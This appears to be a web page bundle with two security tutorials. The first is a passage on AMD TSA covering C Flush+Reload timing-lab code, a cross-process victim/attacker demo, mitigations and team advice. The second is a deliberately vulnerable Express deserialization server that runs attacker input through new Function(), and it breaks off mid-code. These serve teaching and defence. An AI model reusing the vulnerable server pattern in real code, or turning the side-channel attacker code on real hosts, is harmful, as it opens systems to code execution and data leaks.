<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x2A</span>;  <span class="pl-c">// 42 decimal</span>

<span class="pl-k">static</span> <span class="pl-k">inline</span> <span class="pl-smi">uint64_t</span> <span class="pl-en">nsec_now</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">struct</span> <span class="pl-smi">timespec</span> <span class="pl-s1">ts</span>;
    <span class="pl-en">clock_gettime</span>(<span class="pl-c1">CLOCK_MONOTONIC_RAW</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">ts</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint64_t</span>)<span class="pl-s1">ts</span>.<span class="pl-c1">tv_sec</span> <span class="pl-c1">*</span> <span class="pl-c1">1000000000ull</span> <span class="pl-c1">+</span> <span class="pl-s1">ts</span>.<span class="pl-c1">tv_nsec</span>;
}

<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-smi">uint64_t</span> <span class="pl-en">time_access_ns</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();

    <span class="pl-k">return</span> <span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>;
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x05</span>;

    <span class="pl-c">// Simple multiple trials to average timing</span>
    <span class="pl-k">const</span> <span class="pl-smi">int</span> <span class="pl-s1">trials</span> <span class="pl-c1">=</span> <span class="pl-c1">50</span>;

    <span class="pl-c">// prime+victim</span>
    <span class="pl-en">flush_probe_array</span>();
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT64_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">total</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;
        <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">trials</span>; <span class="pl-s1">t</span><span class="pl-c1">++</span>) {
            <span class="pl-s1">total</span> <span class="pl-c1">+=</span> <span class="pl-en">time_access_ns</span>(<span class="pl-s1">idx</span>);
        }
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">avg</span> <span class="pl-c1">=</span> <span class="pl-s1">total</span> / <span class="pl-s1">trials</span>;

        <span class="pl-k">if</span> (<span class="pl-s1">avg</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">avg</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (avg time = %llu ns)\\n"</span>,
           <span class="pl-s1">best_idx</span>, (<span class="pl-smi">unsigned long long</span>)<span class="pl-s1">best_time</span>);

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This looks similar to the timing setups in CPU side-channel courses and Spectre labs, where you average many samples to separate cache hits from misses.</p>
<div class="markdown-heading"><h3 class="heading-element">4.3 Splitting victim and attacker (two processes, shared memory)</h3><a id="user-content-43-splitting-victim-and-attacker-two-processes-shared-memory" class="anchor" aria-label="Permalink: 4.3 Splitting victim and attacker (two processes, shared memory)" href="#43-splitting-victim-and-attacker-two-processes-shared-memory"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>To make the lab feel more like a <strong>cross-process leak</strong> (closer to TSA’s “other context” threat model), you can separate victim and attacker into <strong>two processes</strong> that share memory via <code>shm_open</code> / <code>mmap</code>.</p>
<p><strong>Shared header:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// common.h</span>
<span class="pl-k">#pragma</span> once
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> {
    <span class="pl-smi">uint8_t</span> <span class="pl-c1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">stop</span>;      <span class="pl-c">// flag to tell victim to stop</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">ready</span>;     <span class="pl-c">// flag for simple sync</span>
};</pre></div>
<p><strong>Victim process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// victim.c</span>
<span class="pl-c">// gcc -O2 -march=native -o victim victim.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>

<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x7F</span>;

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span> | <span class="pl-c1">O_CREAT</span>, <span class="pl-c1">0600</span>);
    <span class="pl-en">ftruncate</span>(<span class="pl-s1">fd</span>, <span class="pl-k">sizeof</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span>));
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Initialize</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span>) {
        <span class="pl-c">// attacker_hint could be communicated via shared memory too;</span>
        <span class="pl-c">// here we just fix it for simplicity</span>
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x11</span>;
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
        <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
        __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
    }

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p><strong>Attacker process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// attacker.c</span>
<span class="pl-c">// gcc -O2 -march=native -o attacker attacker.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span>, <span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned</span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span>, <span class="pl-c1">0600</span>);
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Wait for victim to init</span>
    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span>) { }

    <span class="pl-c">// Flush cache lines first</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }

    <span class="pl-c">// Give victim some time to run and "prime" one line</span>
    <span class="pl-en">usleep</span>(<span class="pl-c1">10000</span>);

    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">sh</span>, <span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index (cross-proc) = %d, time = %u cycles\\n"</span>,
           <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Tell victim to stop</span>
    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This is closer in spirit to <strong>“victim in one context, attacker in another”</strong>, even though they’re still on the same OS and sharing memory explicitly. Real TSA removes that explicit sharing: instead of a shared array, the “shared state” is the CPU’s internal scheduler, store queue, and L1 cache.</p>
<div class="markdown-heading"><h3 class="heading-element">4.4 Connecting the lab back to TSA</h3><a id="user-content-44-connecting-the-lab-back-to-tsa" class="anchor" aria-label="Permalink: 4.4 Connecting the lab back to TSA" href="#44-connecting-the-lab-back-to-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Right after these code sections, the key takeaway is:</p>
<ul>
<li>
<p>Our toy lab uses <strong>cache presence</strong> as the side-channel signal (classic Flush+Reload / Prime+Probe).</p>
</li>
<li>
<p>TSA uses <strong>scheduler timing</strong> as the side-channel signal:</p>
<ul>
<li>False completions → invalid data forwarded → different dependency chains → different timing.</li>
</ul>
</li>
<li>
<p>In both cases, the attacker:</p>
<ol>
<li>
<strong>Influences</strong> microarchitectural state (priming),</li>
<li>Lets a victim touch secret-dependent data (access pattern),</li>
<li>Measures a <strong>timing difference</strong> in its own code,</li>
<li>Reconstructs bits of the secret over many trials.</li>
</ol>
</li>
</ul>
<p>That’s the mental bridge you want readers to cross.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">5. Mitigations: what AMD, OSs, and clouds are doing</h2><a id="user-content-5-mitigations-what-amd-oss-and-clouds-are-doing" class="anchor" aria-label="Permalink: 5. Mitigations: what AMD, OSs, and clouds are doing" href="#5-mitigations-what-amd-oss-and-clouds-are-doing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA mitigations span firmware, OS, and virtualization layers.</p>
<div class="markdown-heading"><h3 class="heading-element">5.1 Microcode + VERW</h3><a id="user-content-51-microcode--verw" class="anchor" aria-label="Permalink: 5.1 Microcode + VERW" href="#51-microcode--verw"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD ships updated <strong>microcode</strong> for vulnerable Family 19h CPUs. On top of that, they recommend using the memory form of the <code>VERW</code> instruction as a “microarchitectural scrub”:</p>
<ul>
<li>New CPUID bits tell software:
<ul>
<li>Whether TSA-L1 / TSA-SQ are not present,</li>
<li>Whether the CPU supports TSA mitigation via <code>VERW_CLEAR</code>.</li>
</ul>
</li>
<li>With appropriate microcode loaded, <strong>CPL0 (kernel / hypervisor)</strong> can execute <code>VERW</code> to clear TSA-relevant structures when crossing trust boundaries, e.g.:
<ul>
<li>Kernel → user transitions,</li>
<li>Hypervisor → guest VM transitions,</li>
<li>Before entering low-power states.</li>
</ul>
</li>
</ul>
<p>This is similar in spirit to existing post-Spectre mitigations (IBPB, STIBP, etc.) but targeted at scheduler structures.</p>
<div class="markdown-heading"><h3 class="heading-element">5.2 Linux <code>MITIGATION_TSA</code> and <code>tsa=</code> knob</h3><a id="user-content-52-linux-mitigation_tsa-and-tsa-knob" class="anchor" aria-label="Permalink: 5.2 Linux MITIGATION_TSA and tsa= knob" href="#52-linux-mitigation_tsa-and-tsa-knob"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Linux added explicit support for TSA mitigations:</p>
<ul>
<li>A new Kconfig option <code>MITIGATION_TSA</code> gates TSA-related logic.</li>
<li>A boot parameter <code>tsa=</code> controls behavior (e.g., always on, only for user/kernel transitions, only guest/host transitions, or disabled).</li>
<li>Combined with updated microcode from <code>linux-firmware</code>, this lets distros tune performance vs security trade-offs depending on threat model.</li>
</ul>
<div class="markdown-heading"><h3 class="heading-element">5.3 SEV-SNP and attestation</h3><a id="user-content-53-sev-snp-and-attestation" class="anchor" aria-label="Permalink: 5.3 SEV-SNP and attestation" href="#53-sev-snp-and-attestation"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>For AMD’s <strong>SEV-SNP</strong> (encrypted VM) environments:</p>
<ul>
<li>TSA could, in principle, allow a malicious hypervisor to infer SEV-SNP guest data.</li>
<li>Microcode and firmware updates aim to automatically mitigate TSA for SEV-SNP guests.</li>
<li>Guest owners are expected to:
<ul>
<li>Verify via <strong>attestation</strong> that the host is running the right microcode,</li>
<li>Confirm that TSA mitigations are active before trusting the platform.</li>
</ul>
</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">6. What red teams and blue teams should actually do</h2><a id="user-content-6-what-red-teams-and-blue-teams-should-actually-do" class="anchor" aria-label="Permalink: 6. What red teams and blue teams should actually do" href="#6-what-red-teams-and-blue-teams-should-actually-do"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<div class="markdown-heading"><h3 class="heading-element">6.1 For red teams</h3><a id="user-content-61-for-red-teams" class="anchor" aria-label="Permalink: 6.1 For red teams" href="#61-for-red-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA probably won’t be your <strong>first</strong> move in a real engagement, but it’s worth understanding as part of a modern attack surface:</p>
<ul>
<li>
<strong>Model it as a capability</strong>:
<ul>
<li>“Given local code execution on a shared AMD Zen 3/4 host, I may be able to leak bits of privileged data over time.”</li>
</ul>
</li>
<li>
<strong>Think in campaigns, not single shots</strong>:
<ul>
<li>Meeting the timing conditions and noise requirements means you want long-lived footholds and repeated victim activity.</li>
</ul>
</li>
<li>
<strong>Use it to stress test cloud models</strong>:
<ul>
<li>Ask: “If I’m a rogue tenant on this EPYC host, what’s the maximum <em>theoretical</em> data I can extract from neighbors?”</li>
</ul>
</li>
</ul>
<p>TSA is a great hook for talks and blogs because it forces teams to think beyond “network perimeter” and even beyond “syscall boundary.” The CPU itself is part of the threat surface.</p>
<div class="markdown-heading"><h3 class="heading-element">6.2 For blue teams</h3><a id="user-content-62-for-blue-teams" class="anchor" aria-label="Permalink: 6.2 For blue teams" href="#62-for-blue-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Concrete actions:</p>
<ol>
<li>
<p><strong>Patch like this is Meltdown-class, not just ‘medium CVSS’</strong></p>
<ul>
<li>Make sure:
<ul>
<li>Firmware/microcode is up to date for all Family 19h platforms,</li>
<li>OS / hypervisor builds include TSA mitigations and have <code>tsa=</code> configured appropriately.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Re-evaluate your multi-tenant risk</strong></p>
<ul>
<li>In clouds and shared hosting:
<ul>
<li>Understand which SKUs are affected,</li>
<li>Decide whether you treat TSA as an academic curiosity or something you must mitigate for specific tenants (e.g., high-sensitivity workloads).</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Include TSA in your threat modeling</strong></p>
<ul>
<li>It’s an <strong>info-leak primitive</strong>, not an RCE.</li>
<li>Combine it mentally with other bugs:
<ul>
<li>RCE → TSA → secret exfiltration → crypto break → lateral movement.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Watch for performance regressions</strong></p>
<ul>
<li>VERW-based mitigations may hurt performance; you’ll need to benchmark and possibly make different choices per environment (internal dev vs multi-tenant cloud vs regulated workloads).</li>
</ul>
</li>
</ol>
<hr>
`,wv=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server</h1>
    <blockquote>
      <p>"Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation." — OWASP</p>
    </blockquote>
    <p>CVE-2025-55182 ("React2Shell") pushed insecure deserialization back into the spotlight:</p>
    <ul>
      <li>It’s a CVSS 10.0 RCE in <strong>React Server Components</strong> (RSC).</li>
      <li>The bug lives in the <strong>Flight protocol</strong> used by RSC: attacker-controlled data is <strong>deserialized unsafely</strong>, letting crafted objects influence server-side execution and achieve code execution on the Node.js server.</li>
    </ul>
    <p>You absolutely shouldn’t be testing real React2Shell payloads against anything but an isolated lab. But you <em>can</em> understand the core pattern with a <strong>tiny, self-contained Node.js example</strong> that mimics the same <em>class</em> of bug: deserialization of untrusted data → treating it as special internal objects → executing attacker-controlled behavior.</p>
    <p>This post walks through:</p>
    <ul>
      <li>A quick refresher on insecure deserialization.</li>
      <li>A <strong>toy "fake Flight" server</strong> in Node/Express that’s intentionally vulnerable.</li>
      <li>A harmless "payload" that only evaluates math.</li>
      <li>A safer version of the same endpoint.</li>
      <li>How this maps conceptually to real-world bugs like React2Shell.</li>
    </ul>
    <hr />
    <h2>1. Insecure deserialization in one paragraph</h2>
    <p>Insecure deserialization is when an application takes <strong>untrusted data</strong>, deserializes it into objects, and then uses those objects in ways that let an attacker:</p>
    <ul>
      <li>Manipulate logic,</li>
      <li>Abuse "magic" methods or callbacks,</li>
      <li>Or even <strong>execute arbitrary code</strong>.</li>
    </ul>
    <p>That’s why it shows up in the OWASP Top 10 and is treated as a high-risk category: unsafe deserialization logic can be a straight path to RCE.</p>
    <p>React2Shell is a modern instance of this: the server <strong>deserializes Flight payloads</strong> and interprets them as internal “Chunk” objects. Because that deserialization didn’t sufficiently validate or constrain what those objects could look like, attackers found a way to make React resolve <em>fake</em> chunks and end up running arbitrary JavaScript on the server.</p>
    <p>Let’s recreate that <em>pattern</em> in a tiny Node app.</p>
    <hr />
    <h2>2. A tiny "fake Flight" server (intentionally vulnerable)</h2>
    <p>We’ll build a Node/Express server that:</p>
    <ul>
      <li>Accepts a JSON payload that looks like a "slot map" (<code>"0"</code>, <code>"1"</code>, etc.).</li>
      <li>Pulls out slot <code>"1"</code> as a <strong>"chunk"</strong>.</li>
      <li>Treats any chunk with a <code>then</code> field as special.</li>
      <li>Calls a handler based on <code>chunk.then</code>.</li>
      <li>Uses <code>chunk._expr</code> inside <code>new Function()</code>.</li>
    </ul>
    <p>This is obviously unsafe; that’s the point. It’s a simplified version of the larger deserialization &amp; "thenable" handling patterns described in real-world React2Shell writeups.</p>
    <h3>2.1 Setup</h3>
    <pre><code class="language-bash">mkdir fake-flight-lab
cd fake-flight-lab
npm init -y
npm install express body-parser</code></pre>
    <h3>2.2 Vulnerable server (<code>server-vuln.js</code>)</h3>
    <pre><code class="language-javascript">const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// --- Fake "chunk" resolver (vulnerable) ---

// Very naive "promise-like" resolver: if an object has a \`then\` field,
// we treat it as something that needs to be "resolved" via a handler.
const thenHandlers = {
  // Our "legit" handler; mapping is attacker-controllable in this toy
  logAndEval: function (chunk, response) {
    console.log("[*] logAndEval called with chunk:", chunk);

    // Attacker-controlled field:
    const expr = chunk._expr;

    // VULNERABLE: directly compile and run attacker-controlled string.
    // In real bugs, this might be an internal expression or dynamic call.
    const fn = new Function(\`return (\${expr});\`);

    const result = fn();
    response.value = result;
  },
};

// Fake "Flight" endpoint
app.post("/fake-flight", (req, res) => {
  const payload = req.body;

  console.log("[*] Received payload:", JSON.stringify(payload, null, 2));

  // Pick slot "1" as our main "chunk"
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // VULN #1: trust that whatever is in \`chunk.then\` is a valid handler name
    const handlerName = chunk.then;

    // VULN #2: look it up dynamically without validation
    const handler = thenHandlers[handlerName];

    if (typeof handler !== "function") {
      throw new Error("No such handler");
    }

    // Call the handler with the (attacker-controlled) chunk
    handler(chunk, response);

    // Serialize the result
    res.json({
